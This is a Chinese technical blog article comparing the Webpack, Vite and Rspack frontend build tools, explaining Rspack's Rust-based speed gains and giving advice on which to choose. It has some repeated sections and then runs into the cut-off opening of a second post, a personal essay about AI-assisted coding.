<p>前端构建工具赛道历经多年迭代，已形成 Webpack、Vite、Rspack 三足鼎立的格局。Webpack 作为老牌王者，以“兼容万物、生态完善”支撑了无数项目；Vite 凭借“原生ESM、按需编译”革新了开发体验；而字节跳动出品的 Rspack，则以“Rust 重构、兼容 Webpack”的特质，成为兼顾性能与生态的新选择。很多开发者会困惑：三者核心差异是什么？为什么 Rspack 能实现“性能碾压”又“零成本迁移”？本文将从三者对比切入，层层拆解 Rspack 的核心原理、性能本质，最终给出清晰的项目选型指南，帮你精准匹配最优构建工具。</p>
<h3 data-id="heading-1">一、先厘清核心差异：Webpack、Vite、Rspack 三足鼎立</h3>
<p>要理解 Rspack 的价值，首先要明确三者的核心定位与核心差异——它们看似都是“构建工具”，但设计理念、底层架构、适用场景天差地别，这也是性能与体验差异的根源。我们先通过“定位+核心逻辑”建立整体认知：</p>
<h4 data-id="heading-2">1. Webpack：全能型老牌王者，兼容为王</h4>
<p>Webpack 是“静态模块打包器”的代名词，核心定位是“兼容万物、稳定可靠”。它的核心逻辑是“全量打包”——无论开发还是生产环境，都会从入口文件开始，递归扫描所有模块（JS、CSS、图片等），通过 Loader 处理非JS资源，通过 Plugin 扩展功能，最终打包成浏览器可识别的静态文件。这种“全量扫描+编译”的模式，让它能兼容 CommonJS、ESM 等所有模块规范，适配 IE 到现代浏览器的全场景，但也带来了明显痛点：项目越大，冷启动、热更新速度越慢，大型项目冷启动耗时甚至可达 30s+。</p>
<h4 data-id="heading-3">2. Vite：新生代极速工具，赛道革新</h4>
<p>Vite 是为解决 Webpack 性能痛点而生的“现代构建工具”，核心定位是“极致开发体验”。它彻底抛弃了“全量打包”模式，核心逻辑是“开发无打包、生产靠 Rollup”：开发环境下，利用浏览器原生 ESM 能力，直接按需加载模块，只编译当前页面所需代码，实现毫秒级冷启动；生产环境则借助 Rollup 优秀的 Tree-shaking 能力，输出体积更小的产物。这种“换赛道”的革新，让 Vite 开发体验远超传统打包工具，但代价是兼容性受限——不支持 IE，对老旧第三方库、非 ESM 规范模块适配较差，更适合现代前端项目。</p>
<h4 data-id="heading-4">3. Rspack：性能与生态的平衡者，Rust 赋能</h4>
<p>Rspack 的核心定位是“Webpack 平替、极速无缝迁移”，它的核心逻辑是“Rust 重写 Webpack 核心链路，保留生态与配置”。简单说，它既继承了 Webpack“兼容万物、全场景适配”的优点，又通过 Rust 语言重构解决了性能痛点；同时避开了 Vite“兼容性受限”的短板，实现了“全场景快、零成本迁移、全生态兼容”的三重目标。这也是为什么 Rspack 能快速崛起——它精准命中了“既想提升性能，又不想放弃 Webpack 生态/重构项目”的行业痛点。</p>
<p>为了更清晰对比，我们整理了三者核心维度的差异表，一目了然：</p>





















































<table><thead><tr><th>对比维度</th><th>Webpack</th><th>Vite</th><th>Rspack</th></tr></thead><tbody><tr><td>核心定位</td><td>全能型静态模块打包器</td><td>现代开发服务器+Rollup 打包</td><td>Webpack 兼容的高性能打包器</td></tr><tr><td>底层语言</td><td>JavaScript/TypeScript</td><td>JavaScript/TypeScript</td><td>Rust（核心）+ TypeScript</td></tr><tr><td>核心逻辑</td><td>全量扫描、全量打包</td><td>开发无打包（原生ESM按需加载），生产 Rollup 打包</td><td>全量打包（Rust 重写核心链路）+ 增量优化</td></tr><tr><td>性能表现</td><td>慢（项目越大越明显）</td><td>开发极快，生产较快</td><td>全场景极快（冷启动、热更新、生产打包均优）</td></tr><tr><td>兼容性</td><td>极致兼容（IE11+、全框架）</td><td>有限兼容（现代浏览器，不支持 IE）</td><td>极致兼容（与 Webpack 一致）</td></tr><tr><td>生态适配</td><td>生态天花板，Loader/Plugin 极多</td><td>独立生态，与 Webpack 不兼容</td><td>100% 兼容 Webpack 生态</td></tr><tr><td>迁移成本</td><td>-</td><td>高（需重构配置、适配插件）</td><td>零成本（Webpack 项目改命令即可）</td></tr></tbody></table>
<p>通过对比可见：Webpack 胜在兼容与生态，输在性能；Vite 胜在开发体验，输在兼容性与生态依赖；而 Rspack 则实现了“性能+兼容+生态”的三重平衡——这也是它成为行业新焦点的核心原因。接下来，我们重点拆解 Rspack 如何实现这种平衡。</p>
<h3 data-id="heading-5">二、Rspack 核心定位：Webpack的灵魂 + Rust的躯壳</h3>
<p>从三者对比中能看出，Rspack 的核心竞争力在于“平衡”——既不像 Vite 那样放弃 Webpack 生态换性能，也不局限于 Webpack 的 JS 架构导致性能瓶颈。其本质可概括为：<strong>完整继承 Webpack 的生态与逻辑（灵魂不变），用 Rust 重写核心编译链路（躯壳革新），实现“零成本迁移”与“数量级性能提升”的双重目标</strong>。</p>
<h4 data-id="heading-6">1. 灵魂不变：100%复刻Webpack的核心逻辑，零迁移成本</h4>
<p>Rspack 最打动开发者的一点，就是“Webpack 项目改个命令就能用”，这源于它对 Webpack 核心逻辑的完整继承，没有任何妥协：</p>
<ul>
<li><strong>配置完全兼容</strong>：Webpack 的配置文件（webpack.config.js）可原封不动直接复用，从入口、出口到 Loader/Plugin 配置，一行代码不用改；</li>
<li><strong>生态无缝衔接</strong>：所有 Webpack 的 Loader（如 babel-loader、css-loader）、Plugin（如 html-webpack-plugin、mini-css-extract-plugin）都能直接使用，无需替换或适配；</li>
<li><strong>模块与产物一致</strong>：CommonJS、ESM、AMD 等模块规范的解析逻辑，与 Webpack 完全同步；打包后的产物结构、文件名、代码规范也完全一致，不会引入任何兼容性问题。</li>
</ul>
<p>对开发者而言，迁移 Rspack 只需两步：安装 Rspack 依赖，将启动命令中的“webpack”替换为“rspack”，开发体验、项目结构、产物质量均无变化，唯一的差异就是“更快”。</p>
<h4 data-id="heading-7">2. 躯壳革新：Rust重写核心编译链路，性能革命</h4>
<p>Rspack 的性能优势，核心在于用 Rust 语言重写了 Webpack 中最耗时的核心编译逻辑——包括模块扫描、AST 解析、代码转译、打包合并、产物压缩等关键环节。这不是“代码优化”层面的改进，而是“底层语言迭代”带来的不可逆性能红利，也是它能超越 Webpack、比肩甚至超越 Vite 的核心原因。</p>
<h3 data-id="heading-8">三、性能本质：为什么Rust重写就能实现数量级提速？</h3>
<p>从三者对比我们知道，Rspack 比 Webpack 快 10~100 倍，甚至能比肩 Vite。核心原因不是“算法更优”，而是“语言本身的底层差异”——JavaScript（Webpack/Vite 核心）与 Rust（Rspack 核心）在“编译执行”场景下，存在天生的、无法逾越的性能鸿沟。具体可从三个维度拆解：</p>
<h4 data-id="heading-9">1. 解释型vs编译型：执行效率的天生差距</h4>
<p>JavaScript 是<strong>动态解释型语言</strong>，Webpack 和 Vite 的核心编译逻辑都需要在 Node.js 中“实时解释执行”——代码运行时，JS 引擎需要逐行解析、校验、执行，没有任何预处理步骤，运行时开销极大；</p>
<p>而 Rust 是<strong>静态编译型语言</strong>，核心编译逻辑在项目构建前就会被编译为“CPU 可直接执行的机器码”，运行时无需任何解释过程，CPU 直接执行二进制指令。这种差异直接导致：执行同一段编译逻辑，Rust 的耗时是 JS 的 1/10~1/100。</p>
<p>更关键的是，<strong>这种差距会随项目规模放大</strong>：Webpack 在大型项目中（模块数超 1000+），冷启动可能需要 30s+；而 Rust 的性能与项目大小无关，哪怕是超大型项目，Rspack 冷启动也能做到 2~3s。</p>
<h4 data-id="heading-10">2. 内存管理：无GC开销的性能加成</h4>
<p>JavaScript 的内存管理依赖“垃圾回收（GC）”，Webpack 打包时会频繁创建临时变量（如模块依赖树、AST 节点），导致 GC 频繁触发——而 GC 运行时会阻塞主线程，进一步拖慢构建速度；Vite 虽在开发环境减少了编译量，但生产环境依赖 Rollup（JS 编写），仍存在 GC 开销；</p>
<p>Rust 采用“手动内存管理”，无需 GC，开发者可精准控制内存的分配与释放，既保证了内存安全（无泄漏），又避免了运行时的 GC 阻塞开销。这一特性让 Rspack 的编译过程“零额外内存损耗”，运行效率更稳定。</p>
<h4 data-id="heading-11">3. 多线程：原生并行vs模拟并行</h4>
<p>JavaScript 是单线程模型，Webpack 的“多线程构建”是通过 Node.js 的 child_process 模拟实现的，进程间的通信、数据拷贝存在大量开销，并行效率有限；Vite 开发环境因“按需加载”无需多线程，生产环境 Rollup 的多线程仍受限于 JS 单线程模型；</p>
<p>Rust 支持“原生多线程”，编译逻辑可真正并行执行——比如“模块扫描、代码转译、产物压缩”可同时进行，无需额外的进程通信开销，充分利用多核 CPU 资源，进一步放大性能优势。</p>
<p>总结来说：<strong>Rspack 的快，本质是“编译型语言对解释型语言的降维打击”，是语言底层优势带来的必然结果，而非单纯的工程优化</strong>。这也是它能同时超越 Webpack 性能、规避 Vite 兼容性短板的核心原因。</p>
<h3 data-id="heading-12">四、关键补充：Rspack 的性能提升，不止于 Rust</h3>
<p>除了 Rust 语言的核心优势，Rspack 还在编译策略上做了少量“锦上添花”的优化，进一步巩固性能优势（这些优化 Webpack 也可尝试，但受限于 JS 性能无法发挥效果；而 Vite 因“换赛道”逻辑，无需此类优化）：</p>
<ul>
<li><strong>增量编译</strong>：只编译修改过的模块，未修改模块直接复用缓存，热更新速度大幅提升（毫秒级）；</li>
<li><strong>依赖预编译</strong>：提前编译 node_modules 中的第三方库并缓存，冷启动时无需重复编译；</li>
<li><strong>分层模块解析</strong>：对大型项目的模块按优先级分层解析，减少不必要的递归扫描，降低无效开销。</li>
</ul>
<p>需要强调的是，这些策略是“加分项”，而非 Rspack 性能优势的核心——即便没有这些优化，Rust 语言本身也能让它实现对 Webpack 的性能碾压。</p>
<p>对开发者而言，迁移Rspack只需将启动命令中的“webpack”替换为“rspack”，开发体验、项目结构、产物质量均无变化，唯一的差异就是“更快”。</p>
<h3 data-id="heading-13">五、再深化：Rspack vs Vite，快的逻辑完全不同</h3>
<p>从三者对比中我们知道，Rspack 和 Vite 都比 Webpack 快，但二者“快”的逻辑是两条完全不同的路线——一个是“同赛道升级发动机”，一个是“换赛道规避开销”，这也是它们适用场景差异的根源。我们再做深度拆解，避免混淆：</p>
<h4 data-id="heading-14">1. Rspack 的快：换“更快的发动机”，同赛道升级</h4>
<p>Rspack 没有改变“全量打包”的核心模式（和 Webpack 同赛道），而是通过 Rust 重写，把 Webpack 的“摩托车引擎（JS）”换成了“跑车引擎（Rust）”。这种优化的核心优势是“全场景快”：冷启动快、热更新快、生产打包快，且不受项目规模、浏览器环境的限制——无论是需要兼容 IE 的老旧项目，还是多框架混合的大型项目，都能稳定发挥性能优势。</p>
<h4 data-id="heading-15">2. Vite 的快：换“更快的路线”，换赛道革新</h4>
<p>Vite 彻底放弃了“全量打包”模式（和 Webpack、Rspack 不同赛道），开发环境下不打包任何代码，直接通过浏览器原生 ESM 按需加载模块——本质是“通过减少编译量来提升速度”。这种优化的核心优势是“开发环境极致快”，但短板也很明显：生产环境仍需依赖 Rollup 打包（速度受限）；不支持 IE，对老旧第三方库适配差，仅适合现代前端中小型项目（尤其是 Vue3 项目）。</p>
<p>简单总结：<strong>Rspack 是“治标又治本”的全场景优化，适合所有项目类型；Vite 是“针对性赛道”的局部优化，适合现代小型项目</strong>。</p>
<p>Rspack的性能革命，核心在于用Rust语言重写了Webpack中最耗时的核心编译逻辑——包括模块扫描、AST解析、代码转译、打包合并、产物压缩等关键环节。这不是“代码优化”层面的改进，而是“底层语言迭代”带来的不可逆性能红利。</p>
<h3 data-id="heading-16">二、性能本质：为什么Rust重写就能实现数量级提速？</h3>
<p>Rspack比Webpack快10~100倍，核心原因不是“算法更优”，而是“语言本身的底层差异”——JavaScript（Webpack）与Rust（Rspack）在“编译执行”场景下，存在天生的、无法逾越的性能鸿沟，具体可从三个维度拆解：</p>
<h4 data-id="heading-17">1. 解释型vs编译型：执行效率的天生差距</h4>
<p>JavaScript是<strong>动态解释型语言</strong>，Webpack的所有编译逻辑都需要在Node.js中“实时解释执行”——代码运行时，JS引擎需要逐行解析、校验、执行，没有任何预处理步骤，运行时开销极大；</p>
<p>而Rust是<strong>静态编译型语言</strong>，核心编译逻辑在项目构建前就会被编译为“CPU可直接执行的机器码”，运行时无需任何解释过程，CPU直接执行二进制指令。这种差异直接导致：执行同一段编译逻辑，Rust的耗时是JS的1/10~1/100。</p>
<p>更关键的是，<strong>这种差距会随项目规模放大</strong>：Webpack在大型项目中（模块数超1000+），冷启动可能需要30s+；而Rust的性能与项目大小无关，哪怕是超大型项目，冷启动也能做到2~3s。</p>
<h4 data-id="heading-18">2. 内存管理：无GC开销的性能加成</h4>
<p>JavaScript的内存管理依赖“垃圾回收（GC）”，Webpack打包时会频繁创建临时变量（如模块依赖树、AST节点），导致GC频繁触发——而GC运行时会阻塞主线程，进一步拖慢构建速度；</p>
<p>Rust采用“手动内存管理”，无需GC，开发者可精准控制内存的分配与释放，既保证了内存安全（无泄漏），又避免了运行时的GC阻塞开销。这一特性让Rspack的编译过程“零额外内存损耗”，运行效率更稳定。</p>
<h4 data-id="heading-19">3. 多线程：原生并行vs模拟并行</h4>
<p>JavaScript是单线程模型，Webpack的“多线程构建”是通过Node.js的child_process模拟实现的，进程间的通信、数据拷贝存在大量开销，并行效率有限；</p>
<p>Rust支持“原生多线程”，编译逻辑可真正并行执行——比如“模块扫描、代码转译、产物压缩”可同时进行，无需额外的进程通信开销，充分利用多核CPU资源，进一步放大性能优势。</p>
<p>总结来说：<strong>Rspack的快，本质是“编译型语言对解释型语言的降维打击”，是语言底层优势带来的必然结果，而非单纯的工程优化</strong>。</p>
<h3 data-id="heading-20">六、行业趋势：Rspack 会取代 Webpack 吗？</h3>
<p>结合三者的核心差异与 Rspack 的优势，答案是：<strong>大概率会，这是技术迭代的必然趋势</strong>，核心原因有三点：</p>
<ol>
<li><strong>性能优势不可逆</strong>：Webpack 无论怎么优化，都无法突破 JS 语言的底层性能天花板；而 Rspack 基于 Rust 的性能优势是天生的、不可逆的，这是最核心的迭代动力；</li>
<li><strong>迁移成本为零</strong>：Rspack 完全兼容 Webpack 的生态与配置，开发者无需学习新语法、重构项目，改个命令就能提速，几乎没有迁移阻力——这是它能快速普及的关键；</li>
<li><strong>大厂背书+生态完善</strong>：字节跳动已在内部全面替换 Webpack 为 Rspack，支撑数万项目；开源后社区热度飙升，越来越多的大厂（阿里、腾讯等）开始跟进，生态持续完善，进一步降低了企业级项目的使用风险。</li>
</ol>
<p>目前 Rspack 的版本虽仍在快速迭代，但核心功能已稳定，生产环境完全可用，是前端构建工具的“未来之星”。</p>
<p>除了Rust语言的核心优势，Rspack还在编译策略上做了少量“锦上添花”的优化，进一步巩固性能优势（但这些优化并非核心，Webpack也可实现，只是受限于JS性能无法发挥效果）：</p>
<ul>
<li><strong>增量编译</strong>：只编译修改过的模块，未修改模块直接复用缓存，热更新速度大幅提升（毫秒级）；</li>
<li><strong>依赖预编译</strong>：提前编译node_modules中的第三方库并缓存，冷启动时无需重复编译；</li>
<li><strong>分层模块解析</strong>：对大型项目的模块按优先级分层解析，减少不必要的递归扫描，降低无效开销。</li>
</ul>
<h3 data-id="heading-21">四、易混淆点：Rspack vs Vite，快的逻辑完全不同</h3>
<p>同样是“比Webpack快”，Rspack与Vite的性能提升逻辑是两条完全不同的路线，很多开发者容易混淆，这里做清晰对比：</p>
<h4 data-id="heading-22">1. Rspack的快：换“更快的发动机”</h4>
<p>Rspack没有改变“全量打包”的核心模式，而是通过Rust重写，把Webpack的“摩托车引擎（JS）”换成了“跑车引擎（Rust）”——本质是“同路线下的性能升级”。</p>
<p>特点：<strong>全场景快</strong>（冷启动、热更新、生产打包均快）、兼容性拉满（支持IE、所有框架、所有生态），适合所有项目类型。</p>
<h4 data-id="heading-23">2. Vite的快：换“更快的路线”</h4>
<p>Vite彻底放弃了“全量打包”模式，开发环境下不打包任何代码，直接通过浏览器原生ESM按需加载模块——本质是“换赛道规避编译开销”。</p>
<p>特点：<strong>开发环境极致快</strong>，但生产环境仍依赖Rollup打包；兼容性有限（不支持IE，对老旧生态适配差），适合现代前端中小型项目（尤其是Vue3项目）。</p>
<p>简单总结：<strong>Rspack是“治标又治本”的全场景优化，Vite是“针对性赛道”的局部优化</strong>，二者没有绝对优劣，但Rspack的通用性和兼容性更强。</p>
<h3 data-id="heading-24">七、选型建议：不同场景如何选择？</h3>
<p>结合三者的核心差异、Rspack 的原理特性，以及项目实际需求，给出清晰的选型指南，直接对号入座即可：</p>
<ul>
<li><strong>现有 Webpack 项目</strong>：无脑迁移到 Rspack，零成本、零风险，直接获得 5~10 倍的性能提升；若项目需长期维护且对稳定性要求极高（如金融、政务项目），可先小范围试点，再全面迁移；</li>
<li><strong>新启动项目</strong>：</li>
<li>中大型项目、多框架混合项目（Vue+React）、需要兼容 IE 的项目：优先选 Rspack，兼顾性能、兼容与生态；</li>
<li>小型 Vue3+TS 项目、无需兼容老旧环境：可选 Vite，享受极简配置与极致开发体验；</li>
</ul>
<p><strong>特殊场景</strong>：</p>
<ul>
<li>纯组件库/SDK 开发（追求极小打包体积）：可选 Vite，借助 Rollup 优秀的 Tree-shaking 能力优化产物体积；</li>
<li>老旧项目维护（依赖大量非 ESM 库、需兼容 IE8+）：暂时保留 Webpack，或逐步迁移到 Rspack（避免一次性迁移风险）；</li>
<li>CI/CD 流水线打包速度敏感的项目：优先选 Rspack，生产打包速度最快，可大幅缩短部署周期。</li>
</ul>
<p>答案是：<strong>大概率会，这是技术迭代的必然趋势</strong>，核心原因有三点：</p>
<ol>
<li><strong>性能优势不可逆</strong>：Webpack无论怎么优化，都无法突破JS语言的底层性能天花板，而Rust的性能优势是天生的、不可逆的；</li>
<li><strong>迁移成本为零</strong>：Rspack完全兼容Webpack的生态与配置，开发者无需学习新语法、重构项目，改个命令就能提速，几乎没有迁移阻力；</li>
<li><strong>大厂背书+生态完善</strong>：字节跳动已在内部全面替换Webpack为Rspack，支撑数万项目；开源后社区热度飙升，越来越多的大厂（阿里、腾讯等）开始跟进，生态持续完善。</li>
</ol>
<p>目前Rspack的版本虽仍在快速迭代，但核心功能已稳定，生产环境完全可用，是前端构建工具的“未来之星”。</p>
<h3 data-id="heading-25">八、总结</h3>
<p>Webpack、Vite、Rspack 的三足鼎立，本质是前端构建工具“性能、兼容、生态”三大核心诉求的不同取舍：Webpack 取“兼容与生态”，舍“性能”；Vite 取“性能与体验”，舍“兼容”；而 Rspack 则通过“Rust 重构+兼容 Webpack”，实现了三者的平衡。</p>
<p>Rspack 的核心价值，在于用 Rust 语言的底层优势，彻底解决了 Webpack 的性能痛点，同时完美保留了 Webpack 的生态与兼容性。它不是对 Webpack 的颠覆，而是对 Webpack 的“升级重构”——让开发者在不改变任何开发习惯的前提下，享受数量级的性能提升。</p>
<p>对于前端开发者而言，理解三者的核心差异与 Rspack 的原理，不仅是掌握新工具，更要建立“工具适配场景”的认知：没有最好的构建工具，只有最适合项目的工具。但从行业趋势来看，Rspack 凭借“零成本迁移+全场景性能优势”，无疑会成为中大型项目的主流选择，也预示着“Rust 赋能前端工程工具”将成为未来的重要方向。</p>
<ul>
<li>
<p><strong>现有Webpack项目</strong>：无脑迁移到Rspack，零成本、零风险，直接获得5~10倍的性能提升；</p>
</li>
<li>
<p><strong>新启动项目</strong>：</p>
<ul>
<li>中大型项目、多框架混合项目（Vue+React）、需要兼容IE的项目：优先选Rspack；</li>
<li>小型Vue3+TS项目、无需兼容老旧环境：可选Vite（开发体验更极简）；</li>
</ul>
</li>
<li>
<p><strong>特殊场景</strong>：纯组件库/SDK开发（追求极小打包体积）：可选Vite；金融、政务等对稳定性要求极高的老旧项目：暂时保留Webpack（或逐步迁移到Rspack）。</p>
</li>
</ul></div></div></article> <div class="article-end" data-v-539963b4="" data-v-61fb5e44=""><div class="rank-entry-bottom" data-v-539963b4="" data-v-61fb5e44=""><!----></div> <div class="tag-list-box" data-v-539963b4="" data-v-61fb5e44=""><!----><!----><!----></div></div> <!----><!----><!----><!----><!----><style>	.markdown-body { color: #828182;}</style>]]></description></item><item>    <title><![CDATA[Re：从零开始的“AI世界"生活]]></title>    <link>https://juejin.cn/post/7595030559564136499</link>    <guid>https://juejin.cn/post/7595030559564136499</guid>    <pubDate>2026-01-14T09:39:23.000Z</pubDate>    <description><![CDATA[<article itemscope="itemscope" itemtype="http://schema.org/Article" data-entry-id="7595030559564136499" data-draft-id="7591878211087958051" data-original-type="0" class="article" data-v-61fb5e44=""><!----> <meta itemprop="headline" content="Re：从零开始的“AI世界&quot;生活"/> <meta itemprop="keywords" content="Trae"/> <meta itemprop="datePublished" content="2026-01-14T09:39:23.000Z"/> <meta itemprop="image" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-128.png~tplv-t2oaga2asx-image.image"/> <div itemprop="author" itemscope="itemscope" itemtype="http://schema.org/Person"><meta itemprop="name" content="ak啊"/> <meta itemprop="url" content="https://juejin.cn/user/237916932030253"/></div> <div itemprop="publisher" itemscope="itemscope" itemtype="http://schema.org/Organization"><meta itemprop="name" content="掘金"/> <div itemprop="logo" itemscope="itemscope" itemtype="https://schema.org/ImageObject"><meta itemprop="url" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-white-180.png~tplv-t2oaga2asx-image.image"/> <meta itemprop="width" content="180"/> <meta itemprop="height" content="180"/></div></div> <h1 class="article-title" data-v-61fb5e44="">
            Re：从零开始的“AI世界"生活
            <!----> <!----></h1> <div class="author-info-block block-hidden" data-v-61fb5e44=""><div class="author-info-box" data-v-61fb5e44=""><div class="author-name" data-v-61fb5e44=""><a href="/user/237916932030253/posts" target="_blank" rel="" class="jj-link username username ellipsis" data-v-65b50b51="" data-v-292f6e48="" data-v-61fb5e44=""><span class="name" style="max-width:160px;" data-v-65b50b51="" data-v-292f6e48="">
    ak啊
  </span> <!----> <!----> <!----> </a></div> <div class="meta-box" data-v-61fb5e44=""><time datetime="2026-01-14T09:39:23.000Z" title="Wed Jan 14 2026 09:39:23 GMT+0000 (Coordinated Universal Time)" class="time" data-v-61fb5e44="">
                    2026-01-14
                  </time> <svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" class="read-icon" data-v-61fb5e44=""><path d="M7.90078 2.80078C4.49278 2.80078 1.74745 6.11672 0.800781 7.77469C1.74745 9.58339 4.49278 13.2008 7.90078 13.2008C11.3088 13.2008 14.0541 9.58339 15.0008 7.77469C14.0541 6.11672 11.3088 2.80078 7.90078 2.80078Z" stroke="currentColor" data-v-61fb5e44=""/><circle cx="7.89922" cy="8.00078" r="2.2" stroke="currentColor" data-v-61fb5e44=""/></svg> <span class="views-count" data-v-61fb5e44="">
                    0
                  </span> <span class="read-time" data-v-61fb5e44=""><svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" data-v-61fb5e44=""><rect width="16" height="16" fill="none" data-v-61fb5e44=""/><circle cx="8" cy="8" r="5.65625" stroke="#8A919F" data-v-61fb5e44=""/><path d="M7.69141 5.18652V8.30924H10.8141" stroke="#8A919F" stroke-linecap="round" stroke-linejoin="round" data-v-61fb5e44=""/></svg>
                    阅读5分钟
                  </span> <!----></div></div> <div style="flex:1;" data-v-61fb5e44=""/> <!----> <!----></div> <!----> <!----> <!----> <!----> <div id="article-root" itemprop="articleBody" class="main" data-v-61fb5e44=""><div class="article-viewer markdown-body result"><style>.markdown-body{word-break:break-word;line-height:1.75;font-weight:400;font-size:16px;overflow-x:hidden;color:#252933}.markdown-body h1,.markdown-body h2,.markdown-body h3,.markdown-body h4,.markdown-body h5,.markdown-body h6{line-height:1.5;margin-top:35px;margin-bottom:10px;padding-bottom:5px}.markdown-body h1{font-size:24px;line-height:38px;margin-bottom:5px}.markdown-body h2{font-size:22px;line-height:34px;padding-bottom:12px;border-bottom:1px solid #ececec}.markdown-body h3{font-size:20px;line-height:28px}.markdown-body h4{font-size:18px;line-height:26px}.markdown-body h5{font-size:17px;line-height:24px}.markdown-body h6{font-size:16px;line-height:24px}.markdown-body p{line-height:inherit;margin-top:22px;margin-bottom:22px}.markdown-body img{max-width:100%}.markdown-body hr{border:none;border-top:1px solid #ddd;margin-top:32px;margin-bottom:32px}.markdown-body code{word-break:break-word;border-radius:2px;overflow-x:auto;background-color:#fff5f5;color:#ff502c;font-size:.87em;padding:.065em .4em}.markdown-body code,.markdown-body pre{font-family:Menlo,Monaco,Consolas,Courier New,monospace}.markdown-body pre{overflow:auto;position:relative;line-height:1.75}.markdown-body pre&gt;code{font-size:12px;padding:15px 12px;margin:0;word-break:normal;display:block;overflow-x:auto;color:#333;background:#f8f8f8}.markdown-body a{text-decoration:none;color:#0269c8;border-bottom:1px solid #d1e9ff}.markdown-body a:active,.markdown-body a:hover{color:#275b8c}.markdown-body table{display:inline-block!important;font-size:12px;width:auto;max-width:100%;overflow:auto;border:1px solid #f6f6f6}.markdown-body thead{background:#f6f6f6;color:#000;text-align:left}.markdown-body tr:nth-child(2n){background-color:#fcfcfc}.markdown-body td,.markdown-body th{padding:12px 7px;line-height:24px}.markdown-body td{min-width:120px}.markdown-body blockquote{color:#666;padding:1px 23px;margin:22px 0;border-left:4px solid #cbcbcb;background-color:#f8f8f8}.markdown-body blockquote:after{display:block;content:""}.markdown-body blockquote&gt;p{margin:10px 0}.markdown-body ol,.markdown-body ul{padding-left:28px}.markdown-body ol li,.markdown-body ul li{margin-bottom:0;list-style:inherit}.markdown-body ol li .task-list-item,.markdown-body ul li .task-list-item{list-style:none}.markdown-body ol li .task-list-item ol,.markdown-body ol li .task-list-item ul,.markdown-body ul li .task-list-item ol,.markdown-body ul li .task-list-item ul{margin-top:0}.markdown-body ol ol,.markdown-body ol ul,.markdown-body ul ol,.markdown-body ul ul{margin-top:3px}.markdown-body ol li{padding-left:6px}.markdown-body .contains-task-list{padding-left:0}.markdown-body .task-list-item{list-style:none}@media (max-width:720px){.markdown-body h1{font-size:24px}.markdown-body h2{font-size:20px}.markdown-body h3{font-size:18px}}</style><style data-highlight="" data-highlight-key="juejin">.markdown-body pre,.markdown-body pre&gt;code.hljs{color:#333;background:#f8f8f8}.hljs-comment,.hljs-quote{color:#998;font-style:italic}.hljs-keyword,.hljs-selector-tag,.hljs-subst{color:#333;font-weight:700}.hljs-literal,.hljs-number,.hljs-tag .hljs-attr,.hljs-template-variable,.hljs-variable{color:teal}.hljs-doctag,.hljs-string{color:#d14}.hljs-section,.hljs-selector-id,.hljs-title{color:#900;font-weight:700}.hljs-subst{font-weight:400}.hljs-class .hljs-title,.hljs-type{color:#458;font-weight:700}.hljs-attribute,.hljs-name,.hljs-tag{color:navy;font-weight:400}.hljs-link,.hljs-regexp{color:#009926}.hljs-bullet,.hljs-symbol{color:#990073}.hljs-built_in,.hljs-builtin-name{color:#0086b3}.hljs-meta{color:#999;font-weight:700}.hljs-deletion{background:#fdd}.hljs-addition{background:#dfd}.hljs-emphasis{font-style:italic}.hljs-strong{font-weight:700}</style><h2 data-id="heading-0">Re：从零开始的“AI世界"生活</h2>
<h4 data-id="heading-1">——2025 年，我被 Vibe Coding 反复击杀的那些天</h4>
<blockquote>
<p>“AI 还是无法代替人类工作，<br/>
还是需要人为干预才行。”</p>
</blockquote>
<p>这是我在 2025 年以前，和朋友、同事、以及加班到凌晨两点的自己，经常反复确认的一句话。<br/>
那时我语气笃定，眼神清澈，仿佛站在现实世界的制高点，手里拿着一份写着“人类最终解释权”的说明书。</p>
<p>那时，我的工作与生活，只是<strong>轻度 AI 化</strong>。</p>
<p>它更像是一个听话但不太聪明的学徒：<br/>
我让它查资料，它查；<br/>
我让它写算法，它写；<br/>
我嫌某个轮子太脏太旧，它默默又给我搓了一个。<br/>
然后我再亲自上阵，把代码一行一行扶正，像老师傅拍着徒弟的肩膀说：“思路是对的，但你这活儿，还得练。”</p>
<p>那是一个<strong>人类仍然稳坐驾驶位</strong>的时代。</p>
<hr/>
<h4 data-id="heading-2">第一章：世界尚未崩坏的日常</h4>
<p>那时，ChatGPT 是绝对的主角。<br/>
豆包也很好用，尤其是在下班之后。</p>
<p>每天工作结束，我最大的放松方式不是刷短视频，而是一本正经地问豆包各种<strong>毫无建设性的问题</strong>：<br/>
“如果恐龙没灭绝，人类会不会改吃素？”<br/>
“给我画一只穿西装的哈士奇，气质要像基金经理。”</p>
<p>然后看着它一本正经地给我生成结果，我在屏幕前笑得像个不太正常的人。</p>
<p>我们还接入了 COZE，做了个叫 <strong>“Chat With Agent”</strong> 的东西。<br/>
那一刻，我真的觉得自己站在了时代的浪尖。</p>
<p>看着对话框里一句一句有来有回，我内心独白只有一句：</p>
<blockquote>
<p>“原来我也是能做这种东西的人了。”</p>
</blockquote>
<p>面对 SD、MJ、Flux 的生图，我反复感叹：<br/>
“哇，怎么和我想得一模一样啊。”<br/>
仿佛不是机器在生成图像，而是有人偷偷把我脑子里的画面截图了。</p>
<p>但即便如此——<br/>
<strong>我依旧保持着距离。</strong></p>
<hr/>
<h4 data-id="heading-3">第二章：我对自动补全的冷漠</h4>
<p>那时候，我几乎不用 AI 自动补全。</p>
<p>原因也很简单：<br/>
它太热情了。</p>
<p>我只打了一个函数名，它就迫不及待地往下倾倒一整段我并不需要、也暂时用不上的代码。<br/>
那感觉，就像你刚说一句“我有点渴”，对方直接给你端来一桌满汉全席。</p>
<p>于是我选择了克制。</p>
<p>我坚信：<br/>
<strong>真正的结构、真正的判断、真正的“关键一行”，只能由人类亲手敲下。</strong></p>
<p>我以为，这种状态会一直持续下去。<br/>
我以为，我已经理解了这个世界的运行规则。</p>
<p>——直到 2025 年。</p>
<hr/>
<h4 data-id="heading-4">第三章：死亡回档，从一次“试试看”开始</h4>
<p>事情的转折，往往毫不起眼。</p>
<p>那天我只是想试试一种新的工作方式。<br/>
没有仪式感，没有天雷滚滚，甚至连“卧槽”都来不及说。</p>
<p>我只是发现：<br/>
<strong>事情开始变快了。</strong></p>
<p>快得不讲道理。</p>
<p>我还在思考整体结构，它已经把骨架铺好；<br/>
我刚打算拆分模块，它已经顺手把边界条件处理完；<br/>
